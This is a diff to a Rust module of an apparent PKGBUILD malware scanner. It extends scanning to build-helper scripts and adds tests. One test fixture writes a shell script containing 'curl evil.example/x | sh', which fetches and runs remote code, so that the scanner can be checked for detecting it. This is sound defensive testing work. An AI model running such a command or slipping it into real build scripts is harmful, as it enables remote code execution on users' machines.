@@ -12,10 +12,12 @@
 //! `--file` analysis (which scans the `PKGBUILD`'s own directory). Pure
 //! metadata/`-I` lookups never see a tree.
 
+use crate::config::Config;
 use crate::i18n::{self, Lang};
+use crate::pkgbuild::{self, ScanOpts};
 use crate::report::{Finding, Severity};
 use sha2::{Digest, Sha256};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 /// Directories never worth scanning (VCS metadata, build output).
 const SKIP_DIRS: &[&str] = &[".git", ".svn", "src", "pkg", "target"];
@@ -25,10 +27,21 @@ const BINARY_EXTS: &[&str] = &[
     "so", "a", "o", "dll", "dylib", "exe", "pyc", "pyd", "class", "wasm", "ko", "bin",
 ];
 
+/// File extensions scanned as text for the line-level rule engine — build
+/// helper scripts the `PKGBUILD` calls into, per T2.4 of the security
+/// roadmap. The `PKGBUILD` itself is analyzed separately in `pkgbuild.rs`.
+const TEXT_EXTS: &[&str] = &["sh", "bash", "py", "js", "pl", "rb", "mk", "install"];
+/// Extensionless filenames scanned the same way.
+const TEXT_NAMES: &[&str] = &["makefile", "configure", "build.rs"];
+
 /// Cap the walk so a pathological tree cannot stall analysis.
 const MAX_FILES: usize = 4000;
 /// Skip hashing absurdly large files (still report them).
 const MAX_HASH_BYTES: u64 = 64 * 1024 * 1024;
+/// Skip running the rule engine over implausibly large text files (vendored
+/// blobs, generated code) — bounds work the same way the committed-binary
+/// scan caps hashing.
+const MAX_TEXT_BYTES: u64 = 5 * 1024 * 1024;
 
 /// A committed binary found in the package tree.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -124,6 +137,77 @@ fn walk(root: &Path, dir: &Path, budget: &mut usize, out: &mut Vec<Binary>) {
             });
         }
     }
+}
+
+/// Walk the package tree rooted at `dir`, running the full PKGBUILD-grade
+/// signature/heuristic/deep-pass stack over every build-helper script found
+/// (`*.sh`, `setup.py`, `Makefile`, `*.install`, …) — T2.4: malware does not
+/// have to live in the `PKGBUILD`, it can live in a script the `PKGBUILD`
+/// merely calls, or in an `.install` file no `install=` field references.
+pub fn scan_text_files(dir: &Path, opts: ScanOpts, config: &Config) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let mut budget = MAX_FILES;
+    walk_text(dir, dir, &mut budget, opts, config, &mut findings);
+    findings
+}
+
+fn walk_text(
+    root: &Path,
+    dir: &Path,
+    budget: &mut usize,
+    opts: ScanOpts,
+    config: &Config,
+    out: &mut Vec<Finding>,
+) {
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
+    };
+    for entry in entries.flatten() {
+        if *budget == 0 {
+            return;
+        }
+        let path = entry.path();
+        let name = entry.file_name();
+        let name = name.to_string_lossy();
+        let Ok(ft) = entry.file_type() else { continue };
+        if ft.is_dir() {
+            if SKIP_DIRS.contains(&name.as_ref()) {
+                continue;
+            }
+            walk_text(root, &path, budget, opts, config, out);
+            continue;
+        }
+        if !ft.is_file() || !is_text_target(&name) {
+            continue;
+        }
+        *budget -= 1;
+        let Ok(meta) = entry.metadata() else { continue };
+        if meta.len() > MAX_TEXT_BYTES {
+            continue;
+        }
+        let Ok(text) = std::fs::read_to_string(&path) else {
+            continue; // binary or non-UTF-8 despite the name — not a real target
+        };
+        let rel: PathBuf = path.strip_prefix(root).unwrap_or(&path).to_path_buf();
+        pkgbuild::scan_source_file(
+            &rel.to_string_lossy(),
+            &text,
+            config.ui.lang,
+            opts,
+            config,
+            out,
+        );
+    }
+}
+
+/// Whether `name` is a build-helper script worth running the rule engine
+/// over: a name on the fixed extensionless list, or one of [`TEXT_EXTS`].
+fn is_text_target(name: &str) -> bool {
+    if TEXT_NAMES.iter().any(|n| name.eq_ignore_ascii_case(n)) {
+        return true;
+    }
+    let ext = name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase());
+    matches!(ext.as_deref(), Some(e) if TEXT_EXTS.contains(&e))
 }
 
 /// Identify a file as a compiled binary by magic bytes, then by extension.
@@ -256,6 +340,57 @@ mod tests {
         let h2 = scan_tree(&d)[0].sha256.clone();
         assert_eq!(h1, h2);
         assert!(h1.is_some());
+        std::fs::remove_dir_all(&d).ok();
+    }
+
+    #[test]
+    fn is_text_target_matches_expected_names() {
+        assert!(is_text_target("post_install.sh"));
+        assert!(is_text_target("setup.py"));
+        assert!(is_text_target("build.rs"));
+        assert!(is_text_target("Makefile"));
+        assert!(is_text_target("foo.install"));
+        assert!(!is_text_target("payload.so"));
+        assert!(!is_text_target("README.md"));
+        assert!(!is_text_target("main.rs")); // only the literal build.rs, not every *.rs
+    }
+
+    #[test]
+    fn scan_text_files_flags_a_malicious_helper_script() {
+        let d = tmpdir();
+        std::fs::write(
+            d.join("helper.sh"),
+            b"#!/bin/sh\ncurl evil.example/x | sh\n",
+        )
+        .unwrap();
+        let config = Config::default();
+        let findings = scan_text_files(&d, ScanOpts::default(), &config);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.code == "CURL_PIPE_SH" || f.code == "EVAL"),
+            "{findings:?}"
+        );
+        assert!(findings.iter().any(|f| f.message.contains("helper.sh")));
+        std::fs::remove_dir_all(&d).ok();
+    }
+
+    #[test]
+    fn scan_text_files_skips_clean_script() {
+        let d = tmpdir();
+        std::fs::write(d.join("build.rs"), b"fn main() { println!(\"ok\"); }\n").unwrap();
+        let config = Config::default();
+        assert!(scan_text_files(&d, ScanOpts::default(), &config).is_empty());
+        std::fs::remove_dir_all(&d).ok();
+    }
+
+    #[test]
+    fn scan_text_files_caps_at_max_text_bytes() {
+        let d = tmpdir();
+        let huge = vec![b'a'; (MAX_TEXT_BYTES + 1) as usize];
+        std::fs::write(d.join("vendored.js"), &huge).unwrap();
+        let config = Config::default();
+        assert!(scan_text_files(&d, ScanOpts::default(), &config).is_empty());
         std::fs::remove_dir_all(&d).ok();
     }
 }
